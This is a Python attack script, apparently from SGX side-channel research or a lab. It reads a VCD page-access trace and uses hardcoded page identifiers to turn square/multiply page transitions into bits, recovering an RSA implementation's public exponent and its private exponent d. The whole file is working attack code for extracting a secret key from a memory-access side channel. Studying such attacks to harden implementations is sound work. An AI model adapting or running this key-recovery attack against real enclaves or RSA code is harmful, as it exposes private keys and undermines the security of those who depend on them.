
"""
Legacy RSA Exponent Reconstruction Attack
----------------------------------------

This script demonstrates a legacy approach to reconstructing RSA exponent bitstrings
from a VCD page-access trace. It uses hardcoded page identifiers and a simple symbol
extraction/decoding process to recover the exponent bits.

Workflow:
1. Loads a VCD trace file.
2. Identifies key pages: ANCHOR, A (square), B (multiply), END.
3. Converts page transitions into a symbol sequence:
    - ANCHOR → A       → "A"
    - ANCHOR → B       → "B"
    - ANCHOR → END     → terminates the sequence
4. Decodes the symbol sequence using the Montgomery ladder heuristic:
    - Leading "A"s are ignored
    - "B"  → bit "1"
    - "AA" → bit "0"
5. Splits the trace into segments at each END page, decodes each segment, and recovers
    the exponent bits and their integer values.

Output:
- Prints recovered symbol sequences, bitstrings, and integer values.
- Prints the recovered public (e) and private (d) exponents.

This script is useful for comparison with more modern or modular attack scripts.
"""

from sgxtrace import load_vcd_trace, get_page_intervals, get_timeline_by_time

TRACE = "traces/trace_rsa.vcd"

ANCHOR, A, B, END = "_17", "_20", "_22", "_31"
PAGES = {ANCHOR, A, B, END}


def to_symbols(events):
    seq = [p for _, p in events if p in PAGES]
    out = []
    for p1, p2 in zip(seq, seq[1:]):
        if p1 == ANCHOR and p2 == A:
            out.append("A")
        elif p1 == ANCHOR and p2 == B:
            out.append("B")
        elif p1 == ANCHOR and p2 == END:
            break
    return "".join(out)


def decode(sym):
    tail = sym.lstrip("A")
    bits, i = [], 0
    while i < len(tail):
        if tail[i] == "B":
            bits.append("1")
            i += 1
        elif tail[i:i+2] == "AA":
            bits.append("0")
            i += 2
        else:
            i += 1
    bitstring = "".join(bits)
    return bitstring, int(bitstring, 2) if bitstring else None


trace = load_vcd_trace(TRACE)

cuts = [start for start, _ in get_page_intervals(trace, END, start_filter=1)]

decoded = []
start = 1
for stop in cuts:
    sym = to_symbols(get_timeline_by_time(trace, start, stop))
    bits, value = decode(sym)
    if value is not None:          # filter lege / niet-informatieve segmenten weg
        decoded.append((sym, bits, value))
    start = stop + 1

for i, (sym, bits, value) in enumerate(decoded):
    print(f"[{i}] symbols={sym}  bits={bits}  value={value}")

print()
print(f"e = {decoded[0][2]}")
print(f"d = {decoded[1][2]}")
